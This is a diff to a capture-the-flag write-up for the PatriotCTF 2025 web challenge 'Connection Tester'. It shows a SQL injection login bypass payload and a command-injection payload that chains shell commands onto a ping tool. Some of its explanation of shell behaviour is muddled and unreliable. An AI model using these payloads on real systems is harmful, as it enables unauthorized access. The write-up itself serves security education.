@@ -130,23 +130,29 @@
     <h1>Connection Tester</h1>
     <div class="meta">PatriotCTF 2025 • <span>Web</span> • syndro</div>
 
-    <h2>1. Login Page – Classic SQL Injection</h2>
-    <p>The challenge starts with a simple login form. No tricks — just pure, beautiful SQLi.</p>
+     <h2>0. The Challenge Description</h2>
+
+    <p>There is not much in image description.</p>
+    <img src="Pic/ConnectionTester/1.png" alt="Challenge Description">
+
+    <h2>1. Login Page – SQL Injection</h2>
+    <p>The challenge starts with a simple login form.</p>
+      <img src="https://github.com/user-attachments/assets/d4bf979b-40ee-4515-9eea-c101dd5f33c7" alt="Login form">
+    <p>I tried to do a basic SQL Injection to see how the server behaves.</p>
 
     <p><strong>Payload:</strong></p>
     <pre>Username: ' OR 1=1-- -
-Password: anything</pre>
+    Password: anything</pre>
 
     <p><strong>Resulting Query:</strong></p>
-    <pre>SELECT * FROM users WHERE username = '' OR 1=1-- -' AND password = '...';</pre>
+    <pre><code>SELECT * FROM users WHERE username = '' OR 1=1-- -' AND password = '...';</code></pre>
+    <p>And like that we are in.</p>
 
-    <img src="https://github.com/user-attachments/assets/f153377f-33b5-4ba8-97cd-2c13fd7980f2" alt="Login page">
-    <img src="https://github.com/user-attachments/assets/d4bf979b-40ee-4515-9eea-c101dd5f33c7" alt="Source code hint">
     <img src="https://github.com/user-attachments/assets/bdb0e30c-d989-445f-b574-d535f029f4c1" alt="Logged in as admin">
 
     <h2>2. Dashboard – The Ping Tool</h2>
     <p>Once logged in, we get a "Test Connection" feature that pings any host we enter.</p>
-    <p>Trying <code>127.0.0.1</code> returns real ping output → <strong>command injection confirmed</strong>.</p>
+    <p>Trying <code>127.0.0.1</code> returns output → <strong>Maybe its just shell execution on the backend?</strong>.</p>
 
     <img src="https://github.com/user-attachments/assets/f8c3aac0-726b-472d-b726-2e10c266c1ee" alt="Ping localhost">
 
@@ -155,11 +161,16 @@ Password: anything</pre>
     <pre>/bin/sh -c "ping -c 4 <user_input>"</pre>
     <p>Because of <code>/bin/sh -c</code>, normal separators like <code>;</code> or <code>|</code> are treated as ping arguments → they don’t break out.</p>
     <p>But <code>&amp;</code> and <code>&amp;&amp;</code> work perfectly!</p>
+    <p>Commands like <code>ls</code><code>pwd</code><code>cat</code>Are not going to work, Since they are not a built-in shell Like <code>echo</code></p>
+    <p>And luckily We can use <code>echo</code> to execute our commands by using the following</p>
+    <pre><code>
+      echo "$(command)"
+      The $ returns the variable of the input inside of it.
+      so <code>echo "$(ls)"</code>Would return the directory list! 
+    </code></pre>
 
     <h2>4. Listing Files</h2>
     <p>Payload:</p>
-    <pre>127.0.0.1 & ls</pre>
-    <p>Or better (no ping noise):</p>
     <pre>127.0.0.1 & echo "$(ls)"</pre>
 
     <img src="https://github.com/user-attachments/assets/06f5e09b-2914-4605-bb88-452aaf44a51d" alt="Listing files">
@@ -175,7 +186,7 @@ Password: anything</pre>
       PCTF{C0nnection_****}
     </div>
 
-    <p>Another day, another ping tool pwned.</p>
+    <p>Oh well, that was easy.</p>
   </div>
 </body>
 </html>
